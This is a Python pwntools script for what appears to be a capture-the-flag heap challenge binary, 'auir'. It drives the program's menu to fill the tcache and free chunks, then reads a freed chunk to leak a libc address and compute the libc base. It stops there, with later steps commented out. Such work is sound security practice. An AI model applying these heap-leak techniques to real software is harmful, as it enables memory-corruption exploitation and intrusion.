import pwn as p

# target = p.process('./0ctfbabyheap', env={'LD_PRELOAD': './libc-2.23.so'})
target = p.process('./auir')
p.gdb.attach(target)

# methods to stop making pwn whine about bytes


def b(s: str) -> bytes:
    return s.encode('utf8')


def s(b: bytes) -> str:
    return b.decode('utf8')


def prints(b: bytes):
    print(s(b))


def make_zealots(size: int, payload: bytes):
    prints(target.recvuntil(b'|-------------------------------|\n>>'))
    target.sendline(b'1')
    target.sendline(b(str(size)))
    target.sendline(payload)


def destroy_zealots(index: int):
    prints(target.recvuntil(b'|-------------------------------|\n>>'))
    target.sendline(b'2')
    target.sendline(b(str(index)))


def fix_zealots(index: int, size: int, payload: bytes):
    prints(target.recvuntil(b'|-------------------------------|\n>>'))
    target.sendline(b'3')
    target.sendline(b(str(index)))
    target.sendline(b(str(size)))
    target.sendline(payload)


def display_skills(index: int):
    prints(target.recvuntil(b'|-------------------------------|\n>>'))
    target.sendline(b'4')
    target.sendline(b(str(index)))
    prints(target.recvuntil(b'[*]SHOWING....\n'))
    line = target.recvuntil(b'|-------------------------------|').rstrip(b'|-------------------------------|')
    return line


# fill tcache
for i in range(7):
    make_zealots(0xf0, b'')
    make_zealots(0x70, b'')


make_zealots(0xf0, b'0'*0xf0)  # id 14
make_zealots(0x70, b'1'*0x70)  # id 15
make_zealots(0xf0, b'2'*0xf0)  # id 16
make_zealots(0x70, b'3'*0x70)  # id 17

for i in range(7):
    destroy_zealots(i)
    destroy_zealots(i+7)

destroy_zealots(16)
destroy_zealots(17)

leak = p.u64(display_skills(16)[:8])
print('leak:', hex(leak))
libc_base = leak - 0x1ebbe0
print('libc_base:', hex(libc_base))

# make_zealots(0x70, b'4'*0x70)  # id 25
# make_zealots(0x70, b'5'*0x70)  # id 26

# for i in range(7):
#     destroy_zealots(i+14)

# destroy_zealots(25)
# destroy_zealots(26)

target.interactive()
